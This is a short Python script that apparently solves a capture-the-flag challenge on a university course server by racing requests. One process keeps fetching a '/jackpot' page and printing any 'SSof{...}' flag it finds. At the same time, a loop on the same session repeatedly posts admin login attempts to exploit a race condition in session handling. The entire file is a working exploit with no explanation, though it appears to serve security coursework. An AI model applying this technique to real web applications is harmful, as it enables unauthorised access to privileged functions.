import requests
import re
from multiprocessing import Process

def jackpot():
    while True:
        response = s.get(link + "/jackpot")
        if "SSof{" in response.text:
            print(re.search('SSof{.*}', response.text).group(0))

link = "http://mustard.stt.rnl.tecnico.ulisboa.pt:22652"

s = requests.Session()

s.get(link)

p = Process(target = jackpot)
p.start()

while True:
    data = { 'username' : 'admin', 'password' : 'password' }
    s.post(link + "/login", data = data)